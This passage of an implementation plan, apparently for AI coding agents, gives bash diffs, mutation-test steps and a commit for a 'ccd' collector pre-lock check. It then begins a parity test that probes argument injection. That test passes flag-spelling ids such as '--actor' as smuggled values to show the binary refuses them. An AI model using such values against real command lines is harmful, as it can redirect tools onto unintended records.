_ws_collect_slug_askable() {   # id -> 0 when id names a project and a slug (it holds a `-`); 1 with _WS_COLLECT_REG_WHY
  local id="${1-}"
  [[ "$id" == *-* ]] \
    || { _WS_COLLECT_REG_WHY="$id names no project and slug, so whether its slug is free cannot be asked"; return 1; }
}

_ws_collect_registered() {   # id -> 0 when no registry row stands for id; 1 when one does; 2 when that could not be
```

**3b. `_ws_collect_registered`:** the `*-*` check becomes the call. It stays in the same position, with the same rc and the same detail.

Before:
```bash
    || { _WS_COLLECT_REG_WHY="a wildcard listing of $REG does not show the lock this process holds there, so $REG cannot be listed and no other row of $id could be seen"; return 2; }
  [[ "$id" == *-* ]] \
    || { _WS_COLLECT_REG_WHY="$id names no project and slug, so whether its slug is free cannot be asked"; return 2; }
  _ws_slug_free "${id%-*}" "${id##*-}" && return 0
```
After:
```bash
    || { _WS_COLLECT_REG_WHY="a wildcard listing of $REG does not show the lock this process holds there, so $REG cannot be listed and no other row of $id could be seen"; return 2; }
  _ws_collect_slug_askable "$id" || return 2
  _ws_slug_free "${id%-*}" "${id##*-}" && return 0
```

**3c. `_ws_collect_eval`:** the witness rungs become the judgement.

Before:
```bash
  (( rc != 1 )) || { _ws_collect_refuse registered "$_WS_COLLECT_REG_WHY"; return 1; }
  _ws_tmproot_witness_read "$id"; rc=$?
  (( rc != 1 )) || { _ws_collect_refuse not-witnessed "no witness stands for $id at $(_ws_tmproot_witness_file "$id") and no quarantine record names it — there is nothing to collect"; return 1; }
  (( rc != 2 )) || { _ws_collect_refuse witness-mismatch "the witness $(_ws_tmproot_witness_file "$id") cannot be read as ccd writes it — a temp root nothing vouches for is offered to the operator, never taken"; return 1; }
  [[ "$_WS_WIT_BTIME" != - ]] \
```
After:
```bash
  (( rc != 1 )) || { _ws_collect_refuse registered "$_WS_COLLECT_REG_WHY"; return 1; }
  _ws_collect_witness_judge "$id" || return 1
  [[ "$_WS_WIT_BTIME" != - ]] \
```

**3d. `_ws_collect_resume_eval`:** the record rungs become the judgement. The birth-time rung stays.

Before:
```bash
  local id="$1" rec name slot sleaf orig="$HOME/.cc-tmp/$1" rc sstate=absent ostate=other phase ents
  shift
  (( $# == 1 )) \
    || { _ws_collect_refuse quarantine-kept "$# quarantine records name $id — a resume completes one record and never chooses between several; they are kept for the operator"; return 1; }
  rec="$1"; name="${rec##*/}"; _WS_COLLECT_RECORD="$rec"
  _ws_collect_record_read "$rec"; rc=$?
  (( rc != 1 )) || { _ws_collect_unmeasured records "the quarantine record $rec vanished while it was read"; return 1; }
  (( rc != 3 )) || { _ws_collect_unmeasured quarantine "${_WS_QPATH_WHY:-the physical ~/.cc-tmp could not be resolved} — the slot of $rec was never derived, or whether it stands was never measured; the record stays as it is, and the next pass asks again"; return 1; }
  (( rc == 0 )) || { _ws_collect_refuse quarantine-kept "the quarantine record $rec cannot be read as ccd writes it — it, and whatever it names, are kept for the operator"; return 1; }
  [[ "${_WS_QREC_ID-}" == "$id" ]] \
    || { _ws_collect_refuse quarantine-kept "the quarantine record $rec names ${_WS_QREC_ID-nothing}, not $id — it is kept for the operator"; return 1; }
  [[ "${_WS_QREC_BTIME-}" =~ ^[1-9][0-9]*$ ]] \
```
After:
```bash
  local id="$1" rec name slot sleaf orig="$HOME/.cc-tmp/$1" rc sstate=absent ostate=other phase ents
  shift
  # ONE RECORD, READ AS CCD WRITES IT AND NAMING THIS ID: `_ws_collect_records_judge`, the judgement the pre-lock
  # pass shares (path-identity spec §2.5), so a junk or foreign record is answered in one set of words.
  _ws_collect_records_judge "$id" "$@" || return 1
  rec="$_WS_COLLECT_RECORD"; name="${rec##*/}"
  [[ "${_WS_QREC_BTIME-}" =~ ^[1-9][0-9]*$ ]] \
```

**3e. The two judgements and the pass**, directly above `_ws_collect_fork`.

Before:
```bash
  REAP_VERDICT=collectable
}

_ws_collect_fork() {   # id -> THE ONE EVALUATION `ws-audit --collect` and `ws-collect` share: a standing record
```
After:
```bash
  REAP_VERDICT=collectable
}

_ws_collect_witness_judge() {   # id -> 0 the witness parsed (_WS_WIT_* set); 1 with `not-witnessed` (none stands)
  #                                  or `witness-mismatch` (it is not as ccd writes it) set. Reads only; takes no lock
  # THE FRESH RUNGS' WITNESS READ, moved here whole: `_ws_collect_eval` calls
  # it in their place, and `_ws_collect_prelock` calls it before any lock, so a
  # junk witness is answered in one set of words (path-identity spec §2.5). The
  # birth-time rung stays in the fresh rungs, under the lock.
  local id="$1" rc
  _ws_tmproot_witness_read "$id"; rc=$?
  (( rc != 1 )) || { _ws_collect_refuse not-witnessed "no witness stands for $id at $(_ws_tmproot_witness_file "$id") and no quarantine record names it — there is nothing to collect"; return 1; }
  (( rc != 2 )) || { _ws_collect_refuse witness-mismatch "the witness $(_ws_tmproot_witness_file "$id") cannot be read as ccd writes it — a temp root nothing vouches for is offered to the operator, never taken"; return 1; }
}

_ws_collect_records_judge() {   # id record... -> 0 the ONE record parsed and names id (_WS_COLLECT_RECORD and
  #                                  _WS_QREC_* set); 1 with the answer set: `quarantine-kept` (two or more records, a
  #                                  body not as ccd writes it, or one naming another id), unmeasured `records` (it
  #                                  vanished) or unmeasured `quarantine` (its slot cannot be derived). Reads only
  # THE RESUME'S FIRST RUNGS, moved here whole: `_ws_collect_resume_eval`
  # calls it in their place, and `_ws_collect_prelock` calls it before any
  # lock, so a junk, foreign, vanished or underivable record is answered in one
  # set of words (path-identity spec §2.5). The birth-time rung stays in the
  # resume, under the lock. `name` is set as the resume set it; the resume
  # derives its own from `_WS_COLLECT_RECORD`.
  local id="$1" rec name rc
  shift
  (( $# == 1 )) \
    || { _ws_collect_refuse quarantine-kept "$# quarantine records name $id — a resume completes one record and never chooses between several; they are kept for the operator"; return 1; }
  rec="$1"; name="${rec##*/}"; _WS_COLLECT_RECORD="$rec"
  _ws_collect_record_read "$rec"; rc=$?
  (( rc != 1 )) || { _ws_collect_unmeasured records "the quarantine record $rec vanished while it was read"; return 1; }
  (( rc != 3 )) || { _ws_collect_unmeasured quarantine "${_WS_QPATH_WHY:-the physical ~/.cc-tmp could not be resolved} — the slot of $rec was never derived, or whether it stands was never measured; the record stays as it is, and the next pass asks again"; return 1; }
  (( rc == 0 )) || { _ws_collect_refuse quarantine-kept "the quarantine record $rec cannot be read as ccd writes it — it, and whatever it names, are kept for the operator"; return 1; }
  [[ "${_WS_QREC_ID-}" == "$id" ]] \
    || { _ws_collect_refuse quarantine-kept "the quarantine record $rec names ${_WS_QREC_ID-nothing}, not $id — it is kept for the operator"; return 1; }
}

_ws_collect_prelock() {   # id -> 0 the reap lock may be opened; 1 an answer is set (REAP_VERDICT and REAP_DETAIL;
  #                            _WS_COLLECT_PROBE when unmeasured; _WS_COLLECT_RECORDS once the records were listed)
  #                            and no lock may be opened. ADVISORY: it grants nothing, and prints, journals and
  #                            writes nothing
  # A REAP LOCK IS NEVER UNLINKED, so the first open of `$REG/.reap-<id>.lock`
  # makes a name for good (path-identity spec §2.5). The collect audit
  # (`_ws_collect_audit_contained`) and `cmd_ws_collect` ask this first, so a
  # junk witness, a junk or foreign record and an id with no dash make no lock.
  # It answers only in the words the locked evaluation gives the same disk:
  # `_ws_collect_slug_askable`, `_ws_collect_records_judge` and
  # `_ws_collect_witness_judge` are those rungs, shared. The locked evaluation
  # (`_ws_collect_fork`) lists, reads and parses everything again before any
  # act, so a race between this pass and the lock can only refuse, or be
  # judged again under the lock. In order:
  #   an id with no dash names no slug to ask: unmeasured `registry`;
  #   records that cannot be listed: unmeasured `records`;
  #   a record that parses and names the id opens the lock — the resume judges
  #     a second record, a birth time and the phase under it;
  #   records stand, but none both parses and names the id: the resume's own
  #     judgement answers here, the witness read for the document as the
  #     fork's resume arm reads it;
  #   no record: a witness that parses opens the lock, with a birth time or
  #     none (one with none is `witness-mismatch` under the lock, as before);
  #   a witness that does not parse: THE REGISTRY PEEK. Under the lock the
  #     fresh rungs ask `registered` before the witness, and a row's retryable,
  #     unjournaled `registered` must not become a terminal, journaled
  #     `witness-mismatch` here. So the lock opens unless `$REG/<id>.child` and
  #     `$REG/<id>.uuid` are PROVEN absent (`_ws_reclaim_absent`), a wildcard
  #     of `$REG` lists exactly `$REG/tmproots`, where the witness was just
  #     read (a readable bit is no such proof: an opendir can still fail, and
  #     a glob that fails comes back empty), and `_ws_slug_free` answers free
  #     over every field and dot family `_ws_collect_registered` reads. A lock
  #     opened there is a row's;
  #   otherwise the witness judgement answers: `not-witnessed` or
  #     `witness-mismatch`.
  # A judgement that reads sound on its second look met a writer between the
  # two reads: unmeasured, and the next pass asks again.
  local id="$1" out r rc
  local -a recs=() ctl=()
  _ws_collect_reset
  _ws_collect_slug_askable "$id" || { _ws_collect_unmeasured registry "$_WS_COLLECT_REG_WHY"; return 1; }
  out=$(_ws_collect_records_of "$id"); rc=$?
  (( rc == 0 )) || { _ws_collect_unmeasured records "the quarantine records of $id could not be listed"; return 1; }
  [[ -z "$out" ]] || mapfile -t recs <<< "$out"
  _WS_COLLECT_RECORDS=(${recs[@]+"${recs[@]}"})
  if (( ${#recs[@]} )); then
    for r in "${recs[@]}"; do
      _ws_collect_record_read "$r" && [[ "${_WS_QREC_ID-}" == "$id" ]] && return 0
    done
    _ws_tmproot_witness_read "$id" || :   # the document reports it, as the fork's resume arm reads it
    _ws_collect_records_judge "$id" "${recs[@]}" || return 1
    _ws_collect_unmeasured records "the quarantine record of $id read as ccd writes it only on a second look, so it changed while it was read — the next pass asks again"
    return 1
  fi
  _ws_tmproot_witness_read "$id" && return 0
  # THE LISTING CONTROL, as `_ws_collect_registered` keeps one: the one name a
  # wildcard of `$REG` must find is the directory the witness was read from.
  ctl=("$REG"/tmproot[s])
  _ws_reclaim_absent "$REG/$id.child" && _ws_reclaim_absent "$REG/$id.uuid" \
    && [[ ${#ctl[@]} -eq 1 && "${ctl[0]}" == "$REG/tmproots" ]] \
    && _ws_slug_free "${id%-*}" "${id##*-}" || return 0
  _ws_collect_witness_judge "$id" || return 1
  _ws_collect_unmeasured witness "the witness of $id read as ccd writes it only on a second look, so it changed while it was read — the next pass asks again"
  return 1
}

_ws_collect_fork() {   # id -> THE ONE EVALUATION `ws-audit --collect` and `ws-collect` share: a standing record
```

**3f. The audit's call:** in `_ws_collect_audit_contained`, directly before the lock open.

Before:
```bash
  command -v flock >/dev/null 2>&1 || {
    _ws_collect_unmeasured flock "flock (util-linux) is unavailable, so the reap lock of $id cannot be taken"
    _ws_collect_audit_doc "$id"; return; }
  exec {lfd}>>"$REG/.reap-$id.lock" || {
```
After:
```bash
  command -v flock >/dev/null 2>&1 || {
    _ws_collect_unmeasured flock "flock (util-linux) is unavailable, so the reap lock of $id cannot be taken"
    _ws_collect_audit_doc "$id"; return; }
  # THE ADVISORY PARSE (path-identity spec §2.5): a reap lock is never
  # unlinked, so the audit opens it only for an id a parsed witness or record
  # vouches for, or a registry row may own. It grants nothing: the fork below
  # judges all of it again under the lock.
  _ws_collect_prelock "$id" || { _ws_collect_audit_doc "$id"; return; }
  exec {lfd}>>"$REG/.reap-$id.lock" || {
```

**3g. The verb's call:** in `cmd_ws_collect`, directly before `# THE SHARED LOCK`.

Before:
```bash
      "$(_ws_leaf_why_line "no lock was taken, and nothing was moved or removed: no witness stands for $id ($wf) and its quarantine records could not be listed (${_WS_QRECS_WHY:-the listing failed}), so whether the collector may lock $id was never asked")"
    return 1
  fi
  # THE SHARED LOCK: `$REG/.reap-<id>.lock`, the one ws-reap, ws-reclaim,
  # ws-expire and ws-restore take, so none of them runs on this id at once.
```
After:
```bash
      "$(_ws_leaf_why_line "no lock was taken, and nothing was moved or removed: no witness stands for $id ($wf) and its quarantine records could not be listed (${_WS_QRECS_WHY:-the listing failed}), so whether the collector may lock $id was never asked")"
    return 1
  fi
  # THE ADVISORY PARSE (path-identity spec §2.5): a reap lock is never
  # unlinked, so it is opened only for an id a parsed witness or record vouches
  # for, or a registry row may own. `_ws_collect_prelock` grants nothing:
  # `_ws_collect_locked` judges all of it again under the lock. Its answer
  # comes BEFORE the pause, which is read under the lock: nothing moves either way.
  if ! _ws_collect_prelock "$id"; then
    if [[ "${REAP_VERDICT-}" == unmeasured ]]; then
      _ws_reclaim_fail "$id" "" probe-unmeasured "$(_ws_leaf_why_line "no lock was taken, and nothing was moved or removed: ${REAP_DETAIL-}")"
      return 1
    fi
    _ws_collect_refused "$id" "" "${REAP_VERDICT-}" "no lock was taken: ${REAP_DETAIL-}" "$lc_surface" "$lc_actor" "$lc_reason"
    return 0
  fi
  # THE SHARED LOCK: `$REG/.reap-<id>.lock`, the one ws-reap, ws-reclaim,
  # ws-expire and ws-restore take, so none of them runs on this id at once.
```

**3h. The header's THE LOCK paragraph**, in the WS-AUDIT-COLLECT header. It says the audit takes the lock anywhere inside the population, which 3f makes false.

Before:
```bash
# THE LOCK. Inside the population the audit takes `$REG/.reap-<id>.lock`,
# `-n` — the lock every verb that removes anything of the id takes. It writes
```
After:
```bash
# THE LOCK. Inside the population, and only once `_ws_collect_prelock`'s
# advisory parse lets it (path-identity spec §2.5: a reap lock is never
# unlinked, so that parse decides whether one is ever made), the audit takes
# `$REG/.reap-<id>.lock`, `-n` — the lock every verb that removes anything of
# the id takes. It writes
```

Check that the moved sentences moved rather than doubled:

```bash
grep -c 'names no project and slug, so whether its slug is free cannot be asked' ccd/ccd    # 1
grep -c 'a resume completes one record and never chooses between several' ccd/ccd           # 1
grep -c 'cannot be read as ccd writes it — a temp root nothing vouches for' ccd/ccd         # 1
grep -c '_ws_collect_prelock "\$id"' ccd/ccd                                                 # 2: the audit and the verb
```

- [ ] **Step 4: Restamp, and the stamp's suites**

```bash
bash ccd/ccrc restamp ccd/ccd && bash -n ccd/ccd && node shared/mark.mjs --check ccd/ccd
cd server && ./node_modules/.bin/vitest run test/ownership.test.ts test/mark-check.test.ts
```

Expected: `bash -n` and `--check` exit 0; both suites PASS.

- [ ] **Step 5: Run the new file to green**

```bash
cd server && ./node_modules/.bin/vitest run test/ccd-collect-prelock.test.ts
```

Expected: PASS, 22 tests. As root it is 21 passed and 1 skipped (the unlistable case).

- [ ] **Step 6: Mutation table**

First copy the restamped file to a scratch directory outside the tree:

```bash
S="${TMPDIR:-/tmp}/path-identity-w1b-task9"; mkdir -p "$S" && cp ccd/ccd "$S/ccd.task9"
```

Then, for each row:
- apply the mutation alone with the Edit tool;
- run its command from the workspace root as `(cd server && ./node_modules/.bin/vitest run test/ccd-collect-prelock.test.ts <the row's -t filter>)`;
- see the red;
- restore with `cp "${TMPDIR:-/tmp}/path-identity-w1b-task9/ccd.task9" ccd/ccd`, from the workspace root. Shell state, `S` included, does not carry from one Bash call to the next.

No mutation is restamped (no suite in these commands reads the stamp). Every red below was drafted, not measured: record the measured text. A different count is not a departure; a case that stays green is a STOP, reported by its row number.

| # | Mutation (exact edit, in `ccd/ccd`) | Command (`./node_modules/.bin/vitest run test/ccd-collect-prelock.test.ts …`) | Expected red |
|---|---|---|---|
| T9.1 | `_ws_collect_audit_contained`: delete the line `  _ws_collect_prelock "$id" \|\| { _ws_collect_audit_doc "$id"; return; }` | `-t 'the audit, ws-audit'` | every audit "no lock" case: junk witness, junk record, junk record beside a sound witness, unlistable records, two records, other id, `~/.cc-tmp` and no dash (`expected true to be false`). The registered, unmeasurable, unlistable and control cases stay green |
| T9.2 | `cmd_ws_collect`: delete the whole `if ! _ws_collect_prelock "$id"; then` … `fi` block | `-t 'the verb, ws-collect'` | junk witness: `expected '…' to match /^no lock was taken: the witness /`; pause: `expected 'paused' to be 'witness-mismatch'`; junk record: `expected '…' to match /^no lock was taken: the quarantine record /`; no dash: `expected 'nodash names no project …' to be 'no lock was taken, …'` |
| T9.3 | `_ws_collect_prelock`: delete `  _ws_collect_slug_askable "$id" \|\| { _ws_collect_unmeasured registry "$_WS_COLLECT_REG_WHY"; return 1; }` | `-t 'no dash'` | audit: `no reap lock for an id that names no slug: expected true to be false`; verb: `expected 'nodash names no project …' to be 'no lock was taken, …'` |
| T9.4 | Delete the record-parse `return 0`: `      _ws_collect_record_read "$r" && [[ "${_WS_QREC_ID-}" == "$id" ]] && return 0` becomes `      _ws_collect_record_read "$r" && [[ "${_WS_QREC_ID-}" == "$id" ]]` | `-t 'still take the lock'` | the record half: `expected 1 to be 0` (it answers unmeasured `records`, read sound on a second look, and takes no lock) |
| T9.5 | Let a parsed record naming another id return 0: the same line becomes `      _ws_collect_record_read "$r" && return 0` | `-t 'names another id'` | the stub half: `a reader that parses it as another id’s opens no lock: expected true to be false` |
| T9.6 | Fold read rc 3 into `quarantine-kept`: in `_ws_collect_records_judge`, delete the `  (( rc != 3 )) \|\| { _ws_collect_unmeasured quarantine …` line | `-t 'cannot be resolved'` | `expected 0 to be 1` (it answers `quarantine-kept`, journaled) |
| T9.7 | Delete the `.child`/`.uuid` peek: the peek's first line `  _ws_reclaim_absent "$REG/$id.child" && _ws_reclaim_absent "$REG/$id.uuid" \` becomes `  : \` | `-t 'cannot be measured'` | `expected 0 to be 1` (`witness-mismatch` is journaled with no lock). The plain `.uuid` and `.child` rows stay GREEN, because `_ws_slug_free` sees both (`child-uuid-peek-pinned-by-an-unmeasurable-child`) |
| T9.8 | Delete the `_ws_slug_free` arm: `    && _ws_slug_free "${id%-*}" "${id##*-}" \|\| return 0` becomes `    \|\| return 0` | `-t 'registry row'` | the `.hold`, `.reaping` and dot-family rows: `registered keeps its place ahead of witness-mismatch: expected 'witness-mismatch' to be 'registered'`. The `.uuid` and `.child` rows stay green |
| T9.9 | Delete the listing control's arm: delete the peek's line `    && [[ ${#ctl[@]} -eq 1 && "${ctl[0]}" == "$REG/tmproots" ]] \` | `-t 'searched but not listed'` | `expected 0 to be 1` (`witness-mismatch` over the unseen `.hold`, with no lock) |
| T9.10 | Delete the witness `return 0`: delete the line `  _ws_tmproot_witness_read "$id" && return 0` | `-t 'still take the lock'` | the witness half: `expected 1 to be 0` (unmeasured `witness`, read sound on a second look) |
| T9.11 | `_ws_collect_registered`: replace `  _ws_collect_slug_askable "$id" \|\| return 2` with the two lines 3b removed | `-t 'spelled once'` | `the sentence is spelled once: expected 2 to be 1`, and `expected '…' to contain '_ws_collect_slug_askable "$id" \|\| return 2'` |
| T9.12 | `_ws_collect_prelock`: add `  echo "ccd: the pre-lock pass of $id" >&2` directly after `  _ws_collect_reset` | `-t 'prints nothing'` | `it prints nothing: expected '…' not to match /\b(?:printf\|echo)\b/` |
| T9.13 | `_ws_collect_prelock`: delete its line `  (( rc == 0 )) \|\| { _ws_collect_unmeasured records "the quarantine records of $id could not be listed"; return 1; }`, the one directly below the pass's `  out=$(_ws_collect_records_of "$id"); rc=$?` (`_ws_collect_fork` holds a twin of both lines; leave it) | `-t 'cannot be listed answers unmeasured records'` | `expected 0 to be 1`: an unlistable records directory reads as no record, and the junk witness is journaled `witness-mismatch` |
| T9.14 | `_ws_collect_prelock`: delete the line `    _ws_tmproot_witness_read "$id" \|\| :   # the document reports it, as the fork's resume arm reads it` | `-t 'reports the witness'` | `the document reports the witness, as the fork’s resume arm does: expected null not to be null` (`prelock-reads-the-witness-for-the-document`) |

After the last row:

```bash
S="${TMPDIR:-/tmp}/path-identity-w1b-task9"; cmp ccd/ccd "$S/ccd.task9" && node shared/mark.mjs --check ccd/ccd && rm -r "$S"
(cd server && ./node_modules/.bin/vitest run test/ccd-collect-prelock.test.ts)
```

Expected: `cmp` is silent, `--check` exits 0, and the file is green.

- [ ] **Step 7: Run the task's other suites and guards, unedited, with the pass in place**

```bash
(cd server && ./node_modules/.bin/vitest run test/ccd-collect- test/ccd-ws-collect-)
(cd server && ./node_modules/.bin/vitest run test/ccd-collect-audit-resume.test.ts -t 'VANISHES|no witness at all is resumed|quarantine-kept: TERMINAL')
(cd server && ./node_modules/.bin/vitest run test/collect-readers.test.ts test/collect-pacing.test.ts test/wsaudit.test.ts \
  test/ccd-wsaudit-nonpoison.test.ts test/ccd-refusal-scan.test.ts test/ccd-die-containment.test.ts \
  test/ccd-child-reclaim-pause.test.ts test/macos-platform.test.ts test/ccdargv-dec-parity.test.ts \
  test/ccd-token-verbs-dash-id.test.ts test/ccd-token-verbs-dot-id.test.ts test/ccd-project-dash.test.ts \
  test/ownership.test.ts test/mark-check.test.ts)
(cd server && ./node_modules/.bin/vitest run test/session-hook.test.ts -t 'backticked _identifier')
(cd server && ./node_modules/.bin/tsc --noEmit -p test/tsconfig.tests.json && ./node_modules/.bin/vitest run test/typecheck-tests.test.ts)
```

Expected: PASS everywhere.
- The first command runs the 20 baseline files plus this task's, 21 at the export. A different count is recorded, not a STOP.
- `collect-readers` matches both ways with no new word. `ccd-collect-audit` holds exactly three `_lc_emit` lines and no harvest shape. `ccd-refusal-scan` keeps `SANCTIONED` at 16 and the collect emits at two. `wsaudit` and nonpoison still scan 55 outside the regions.
- The collector files are load-sensitive (CLAUDE.md). Re-run a red file ALONE before calling it a break.
- **A file that stays red alone STOPs the task.**
  - Name it by slug in the ledger and the wave-done, with the measured text.
  - Never edit it, and never weaken an assertion (HARD BOUNDARY). Wait for the coordinator's ruling.
- Predicted risk, named here so it is recognised:
  - The case is `ccd-ws-collect-resume.test.ts`'s `a record whose slot cannot be derived (the reader’s rc 3, …)`.
  - Its stubbed reader is now answered by the pass, so the verb's detail gains the 53-byte `no lock was taken, and nothing was moved or removed: ` prefix.
  - `_ws_leaf_why_line` cuts at 300 bytes, so `toContain('was never derived')` holds only while the fixture HOME is under about 109 bytes, which is an `os.tmpdir()` under about 54.
  - Red there: report `prelock-prefix-cuts-the-rc3-detail` and STOP.

- [ ] **Step 8: Commit**

```bash
git add ccd/ccd server/test/ccd-collect-prelock.test.ts
git commit -F - <<'EOF'
fix(ccd): the collector takes the reap lock only after an advisory parse

A reap lock is never unlinked, so the collect audit and ws-collect made a
permanent $REG/.reap-<id>.lock for any name with a witness file or a
record file name, before either body was read (path-identity spec §2.5).

_ws_collect_prelock now runs directly before each lock open. Before any
lock it answers an id with no dash, records that cannot be listed,
records none of which parses and names the id, and a witness that does
not parse. Each answer uses the words the locked evaluation gives the
same disk. The witness rungs of _ws_collect_eval and the first rungs of
_ws_collect_resume_eval move into _ws_collect_witness_judge and
_ws_collect_records_judge, which both now call. The dash-free sentence
moves into _ws_collect_slug_askable, its one source.

A junk witness beside a registry row of any kind, or beside a registry
that cannot be listed, still opens the lock, so registered keeps its
place ahead of witness-mismatch. A judgement that reads sound only on a
second look answers unmeasured. The pass grants nothing: the locked
evaluation re-reads everything before any act.

At ws-collect, a pre-lock answer now comes before the pause, which is
read under the lock (collect-verb-prelock-refusal-precedes-the-pause).
EOF
```

---

### Task 10: No dash-leading id redirects a verb the server composes, on the real binary

**Model routing:** `opus`, effort `high`. The file adds no ccd code. It is the one place where every argv the server composes meets the real binary with every flag spelling as the id. Its run against the pre-wave `ccd/ccd` is spec §8's measurement of the §2.2 verdicts (R20).

**Why:**
- **Spec §2.8.** `ccdargv-dec-parity` on the real binary, run with the ids `--actor`, `--surface`, `--reason`, `--expect` and `--defer-expired`, plus one fixture-HOME case for each §2.2 verb that answers "refused, never redirected".
- **R19.** That proof lives in a new file, `ccdargv-dash-id-parity.test.ts` (departure slug `dash-parity-in-its-own-file`). `ccdargv-dec-parity.test.ts` stays unedited.
- **R20.** Two things are run once against the pre-wave `ccd/ccd`: the dec matrix and the positional table. The pre-wave copy is written to a scratch file outside the tree and selected through `DASH_PARITY_CCD`, so the tracked file is never overwritten. The per-verb red set is recorded in the SDD ledger (departure slug `section-2-2-verdicts-measured-at-task-10`).
- **Global Constraints, the spawn census.** The file name matches `/^ccd.*\.ts$/`. Its one `bash` spawn has `ghContainedEnv(`, `systemd: true` and `tmux: true` within `SCAN_LOOKBACK_LINES` (12) above it.

**Files:**
- Create `server/test/ccdargv-dash-id-parity.test.ts`.
- Modify: none. `ccd/ccd`, `server/src/ccdargv.ts` and `ccdargv-dec-parity.test.ts` are read, never edited.
- Test: `server/test/ccdargv-dash-id-parity.test.ts`.
- Ledger (gitignored, never committed): append to `.superpowers/sdd/2026-10-12-path-identity-w1b-ccd-id-hardening/progress.md`.

**Interfaces:**
- **Consumes:**
  - `CCD_ARGV` and `type ActorFlags` from `../src/ccdargv.js`, read-only. The builders used are `stopId`, `stopPair`, `forget`, `swap`, `swapCross`, `start`, `enable`, `wsAddWorker`, `wsArchive`, `wsRestore`, `wsHold`, `wsRelease`, `wsRename`, `wsReclaim`, `wsExpire`, `wsCollect`, `wsAudit`, `wsReclaimAudit`, `wsExpireAudit` and `wsCollectAudit`.
  - From `./dashIdFixture.js` (Task 1): `DASH_IDS`, `DECOY_IDS`, `regDirOf(home): string`, `plantRow(home, id, fields?)`, `reapLocks(home): string[]` and `regListing(home): string[]`.
  - From `./ccdWsHelpers.js`: `CCD`, `ghContainedEnv`, `harnessBin`, `makeCcdHarness` and `type CcdHarness`.
  - From `./lifecycleHelpers.js`: `readJournal`, `eventsOf` and `decOf`.
  - From `./gitEnvStrip.js`: `inheritedEnv`. It strips git's inherited repository variables, so the pre-wave run's real `git fetch` and `git worktree add` stay in the fixture repository.
- **Produces (file-local, the names §Interfaces fixes):**
  - `const DEC_WITH_REASON: ActorFlags = { surface: 'agent', actor: 'probe:dec parity', reason: 'probe reason' }`
  - `interface DashProbe { argv: (id: string, dec: ActorFlags) => readonly (readonly string[])[]; decoy: () => void; untouched: (id: string) => void }`
  - `const DASH_PROBES: Record<string, DashProbe>`, keyed by the nine `decAppendingVerbs()` verbs plus `'stop'`
  - `interface PositionalProbe { argv: (dash: string) => readonly (readonly string[])[]; expect: 'refused' | 'literal' }`
  - `const POSITIONAL_PROBES: Record<string, PositionalProbe>`
  - `const CCD_UNDER_TEST = process.env.DASH_PARITY_CCD ?? CCD`

---

- [ ] **Step 0: Entry conditions (Tasks 1 to 9 are committed; measure, never assume)**

Run from the workspace root. The anchors below are the §Interfaces text as Tasks 2 to 9 wrote it.

```bash
git status --porcelain -- ccd/ccd server/test; echo "a0 done"                                           # (a0) prints nothing above the echo: nothing uncommitted
grep -c '^_reg_id_ok() \|^_ws_collect_prelock() \|^_reg_id_cap() ' ccd/ccd                              # (a1) 3
grep -cF -e '--session)   if (( $# >= 2 )); then lc_args+=("$1" "$2"); shift 2; else lc_args+=("$1"); shift; fi ;;' ccd/ccd   # (a2) 3: release, archive, restore, in that file order
grep -nF -e '--session)   if (( $# >= 2 )); then lc_args+=("$1" "$2"); shift 2; else lc_args+=("$1"); shift; fi ;;' ccd/ccd; grep -n '^cmd_ws_release()\|^cmd_ws_archive()\|^cmd_ws_restore()' ccd/ccd   # (a3) each arm line lies after its own function's start and before the next one's
grep -cF -e '--expect|--session) if (( $# >= 2 )); then args+=("$1" "$2"); shift 2; else args+=("$1"); shift; fi ;;' ccd/ccd   # (a4) 2: expire first, collect second
grep -cF -e '--expect|--child-of|--session) if (( $# >= 2 )); then args+=("$1" "$2"); shift 2; else args+=("$1"); shift; fi ;;' ccd/ccd   # (a5) 1
grep -cF -e '_reg_id_ok() { local LC_ALL=C; [[ "${1-}" =~ ^[A-Za-z0-9._-]+$ && "${1-}" != -* ]]; }' ccd/ccd   # (a6) 1
grep -cF -e '[[ $# -ge 2 && $2 != -* ]] || die "usage: ccd stop' ccd/ccd                                # (a7) 1
grep -cF -e 'for a in "$@"; do [[ $a != -* ]] || die "bad session id: $a"; done' ccd/ccd                # (a8) 1
grep -cF -e '[[ $# -ge 2 ]] && (( ! lc_ga )) ||' ccd/ccd                                                # (a9) 1
awk '/^_ws_project_valid\(\)/{f=1} f{print} f&&/^}/{exit}' ccd/ccd | grep -cF -e '  [[ "$1" != -* ]] || return 1'   # (a10) 1
grep -n '^export' server/test/dashIdFixture.ts                                                          # (a11) DASH_IDS, DashId, DECOY_IDS, regDirOf, plantRow, reapLocks, regListing, wideLetterLocale
grep -n "argv(surface === null" server/src/ccdargv.ts                                                   # (a12) record stopId's order: id first (pre-W1a) or `--surface` first (W1a)
(cd server && ./node_modules/.bin/vitest run test/ccdargv-dec-parity.test.ts)                           # (a13) PASS, unedited
```

- Record (a12) in the ledger. The file picks stop's typed second argv from the builder at run time, so (a12) changes no code.
- If any count differs, **STOP**. Report `parity-mutation-anchor-moved` with the measured line. Step 4's mutations replace these exact strings, so never guess a different one.
- If (a13) is red, **STOP**. Report `dec-parity-red-before-task-10`.

- [ ] **Step 1: Write the test file** `server/test/ccdargv-dash-id-parity.test.ts`:

```ts
// server/test/ccdargv-dash-id-parity.test.ts
//
// NO DASH-LEADING ID REDIRECTS A VERB THE SERVER COMPOSES, MEASURED ON THE REAL
// BINARY (path-identity spec §2.2, §2.8).
//
// The server appends its decision flags AFTER the id:
// `<verb> --session <id> --surface <s> --actor <a> [--reason <r>]`. Before
// path-identity W1b, each of the eight `--session` loops in ccd collected every
// token it did not recognise into one residue, and bound `--session <id>` from
// that residue only afterwards. So an id that spelled a flag was scanned again as
// one. With an id of `--actor`, `--actor --surface` read as a pair, and the
// surface word (the sweeps' `agent`, or the console's `pwa`) was left over as the
// id. stop's positional id and ws-add's positional project had the same shape.
// W1b takes each identity pair whole and refuses a dash-leading id. This file is
// the crossing nothing else makes for it: every argv a builder in `ccdargv.ts`
// composes, with every flag spelling as the id, run through the real `ccd` in a
// fixture HOME.
//
// WHAT A ROW ASSERTS. The fixture plants decoy rows named for the surface words,
// each holding a hold, and a row named for the probed id itself. A row is green
// when the verb does all of these:
//   - it refuses: a non-zero exit, or a `"refused"` document at exit 0;
//   - it never answers as a verb that looked the id up as a row;
//   - it creates no reap lock;
//   - it journals nothing naming a decoy or the probed id, except ws-restore's
//     own `bad-session-id` refusal, which journals the id it refused;
//   - it changes no unit, and kills or makes no pane;
//   - it changes no registry row or field, and leaves each decoy as it was.
//
